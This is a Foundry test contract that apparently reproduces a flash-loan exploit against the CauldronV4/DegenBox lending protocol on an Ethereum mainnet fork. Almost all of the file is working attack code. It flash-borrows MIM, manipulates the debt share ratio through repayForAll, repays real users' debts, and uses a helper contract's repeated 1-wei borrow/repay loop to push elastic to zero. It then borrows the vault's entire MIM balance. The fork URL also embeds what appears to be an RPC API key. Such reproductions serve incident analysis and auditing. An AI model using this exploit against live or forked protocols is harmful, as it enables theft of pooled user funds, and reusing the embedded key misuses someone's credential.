// pragma solidity 0.6.12;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

import "../src/CauldronV4.sol";
import "../src/interfaces/IBentoBoxV1.sol";
import "../src/BoringSolidity/interfaces/IERC20.sol";

import "../src/BoringSolidity/libraries/BoringRebase.sol";
import "../src/interfaces/ICurvePool.sol";

interface IUSDT {
    function approve(address _spender, uint256 _value) external;

    function balanceOf(address owner) external view returns (uint256);

    function transfer(address _to, uint256 _value) external;
}

contract Exploit is Test, IFlashBorrower {
    IERC20 private MIM = IERC20(0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3);
    IUSDT private USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 private Crv3_USD_BTC_ETH = IERC20(0xc4AD29ba4B3c580e6D59105FFf484999997675Ff);
    IERC20 private yvCurve_3Crypto_f = IERC20(0x8078198Fc424986ae89Ce4a910Fc109587b6aBF3);

    IBentoBoxV1 private degenBox = IBentoBoxV1(0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce);
    CauldronV4 private cauldron = CauldronV4(0x7259e152103756e1616A77Ae982353c3751A6a90);

    ICurvePool private MIM_3LP3CRV = ICurvePool(0x5a6A4D54456819380173272A5E8E9B9904BdF41B);
    ICurvePool private USDT_WBTC_WETH = ICurvePool(0xD51a44d3FaE010294C616388b506AcdA1bfAAE46);
    
    
    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/Npi7Jck9dBlk2_631bU_QBHlBPN2v2-d", 19118659);

    }

    function testExploit() external {
        console2.log("[+] Start Exploit");

        uint256 initialBalance = MIM.balanceOf(address(this));

        MIM.approve(address(degenBox), type(uint256).max);
        MIM.approve(address(MIM_3LP3CRV), type(uint256).max);
        USDT.approve(address(USDT_WBTC_WETH), type(uint256).max);
        Crv3_USD_BTC_ETH.approve(address(yvCurve_3Crypto_f), type(uint256).max);
        yvCurve_3Crypto_f.approve(address(degenBox), type(uint256).max);

        console2.log("[+] Begin flash-loan attack");
        degenBox.flashLoan(
            this, 
            address(this), 
            MIM, 
            300000000000000000000000, 
            "");
        
        uint256 finalBalance = MIM.balanceOf(address(this));
        console2.log("[+] Attacker MIM final balance", finalBalance);

        assert(initialBalance < finalBalance);
    }

    function onFlashLoan(
        address sender,
        IERC20 token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external {

        // Begin of the attack. Deposit on degenBox and call repayForAll

        console2.log("[+] Deposit and desync ratio of shares and assets");

        uint256 deposit_amount = 8894382279231396727995;
        degenBox.deposit(MIM, address(this), address(degenBox), deposit_amount, 0);
        IStrictERC20(address(MIM)).transfer(address(cauldron), 240000000000000000000000);
        cauldron.repayForAll(240000000000000000000000, true);

        // Share ratio increased from 1:1 to 1:26
        // Repaying manually debts to lower both base and elastic

        console2.log("[+] Repay manually debts to deflate even more");

        address[] memory users = new address[](15);
        users[0] = 0x941ec857134B13c255d6EBEeD1623b1904378De9;
        users[1] = 0x2f2A75279a2AC0C6b64087CE1915B1435b1d3ce2;
        users[2] = 0x577BE3eD9A71E1c355f519BBDF5f09Ba2018b1Cc;
        users[3] = 0xc3Be098f9594E57A3e71f485a53d990FE3961fe5;
        users[4] = 0xEe64495BF9894f6c0A2Df4ac983581AADb87f62D;
        users[5] = 0xe435BEbA6DEE3D6F99392ab9568777EB8165719d;
        users[6] = 0xc0433E26E3D2Ae7D1D80E39a6D58062D1eAA54f5;
        users[7] = 0x2c561aB0Ed33E40c70ea380BaA0dBC1ae75Ccd34;
        users[8] = 0x33D778eD712C8C4AdD5A07baB012d1ce7bb0B4C7;
        users[9] = 0x214BE7eBEc865c25c83DF5B343E45Aa3Bf8Df881;
        users[10] = 0x3B473F790818976d207C2AcCdA42cb432b749451;
        users[11] = 0x48ED01117a130b660272228728e07eF9efe21A30;
        users[12] = 0x7E1C8fEF68a87F7BdDf4ae644Fe4D6e6362F5fF1;
        users[13] = 0xD24cb02BEd630BAA49887168440D90BE8DA6708c;
        users[14] = 0x0aB7999894F36eDe923278d4E898e78085B289e6;

        uint256 _amount;
        for (uint256 i=0; i<users.length; i++) {
            _amount = cauldron.userBorrowPart(users[i]);
            cauldron.repay(users[i], true, _amount);
        }

        _amount = cauldron.userBorrowPart(0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A);
        cauldron.repay(0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A, true, (_amount - 100));

        // round 1
        cauldron.repay(0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A, true, 1);

        // round 2
        cauldron.repay(0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A, true, 1);

        // round 3
        cauldron.repay(0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A, true, 1);

        // now base: 97 and elastic: 0

        // depositing collateral token. needed to have some collateral to perform next steps
        // in order to obtain 3CRV LP tokens the attacker had to deposit on multiple pools

        MIM_3LP3CRV.exchange_underlying(0, 3, 2000000000000000000000, 0);
        uint256 usdt_balance = USDT.balanceOf(address(this));
        // console2.log("attacker balance USDT", usdt_balance);
        uint256[3] memory amounts;
        amounts[0] = usdt_balance;
        amounts[1] = 0;
        amounts[2] = 0;
        // USDT_WBTC_WETH.add_liquidity(amounts, 0);
        (bool success, ) = address(USDT_WBTC_WETH).call(
            abi.encodeWithSelector(bytes4(0x4515cef3), amounts, 0)
        );

        usdt_balance = Crv3_USD_BTC_ETH.balanceOf(address(this));
        
        // yvCurve_3Crypto_f.deposit(Crv3_USD_BTC_ETH.balanceOf(address(this)));
        (success, ) = address(yvCurve_3Crypto_f).call(
            abi.encodeWithSelector(
                bytes4(0xb6b55f25),
                usdt_balance
            )
        );

        // Deposit yvCurve_3Crypto_f balance to degenBox

        uint256 depositAmount = yvCurve_3Crypto_f.balanceOf(address(this));
        // console2.log("attacker balance on yvCurve_3Crypto_f", depositAmount);

        degenBox.deposit(
            yvCurve_3Crypto_f,
            address(this),
            address(cauldron),
            depositAmount,
            0
        );

        // Perform the second part of the share deflation
        // The goal here is to have elastic: 0 and base: high number

        console2.log("[+] Using a second account to lower shares value to zero");

        ExploitHelper helper = new ExploitHelper();    
        helper.help();

        // at this point thanks to elastic: 0 we can borrow up to vault balance
        // and thanks to base as high number we can get away with it because the
        // share value is close to zero

        console2.log("[+] Now that elstic is zero we can borrow up to degenBox balance of MIM");

        uint256 borrowAmount = degenBox.balanceOf(MIM, address(cauldron));

        cauldron.addCollateral(address(this), true, depositAmount - 100 ); 
        cauldron.borrow(address(this), borrowAmount);
        degenBox.withdraw(MIM, address(this), address(this), borrowAmount, 0);

        // repay the flashloan and take profit with what's left

        console2.log("[+] Withdrawn borrow amount, repaying flashloan and take the rest");

        uint256 toRepay = 300000000000000000000000 + fee;
        IStrictERC20(address(MIM)).transfer(address(degenBox), toRepay);
    }
}

// A second account is needed in otherwise it wouldn't be possible to take out
// tokens from the vault

contract ExploitHelper {
    CauldronV4 private cauldron = CauldronV4(0x7259e152103756e1616A77Ae982353c3751A6a90);    

    function help() external {

        // add little collateral, enough to manipulate ratio of shares and assets

        cauldron.addCollateral(address(this), true, 100);
        
        // needed to get elastic to 1

        cauldron.borrow(address(this), 1);

        // now base: 98 and elastic: 1

        for (int i=0; i<90; i++) {

            // borrow 1 and repay 1
            // This will double the base amount every round

            cauldron.borrow(address(this), 1);
            cauldron.repay(address(this), true, 1);
        }

        // repay last wei of debt

        cauldron.repay(address(this), true, 1);

        // at this point elastic: 0 and base goes to infinite
        // even if all the math is against the user, there's an edge case that
        // will make the protocol lose money
    }
}
